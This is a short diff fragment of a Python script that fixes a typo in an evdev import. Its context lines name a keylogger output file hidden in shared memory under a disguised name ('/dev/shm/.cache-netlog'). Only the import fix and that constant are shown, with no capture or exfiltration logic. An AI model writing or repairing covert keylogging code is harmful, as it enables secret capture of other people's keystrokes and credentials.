@@ -1,7 +1,7 @@
 import time
 import os
 import threading
-from evdev import InputDevice, categorize, ecodess
+from evdev import InputDevice, categorize, ecodes
 
 KEYLOGGER_FILE = "/dev/shm/.cache-netlog"
 
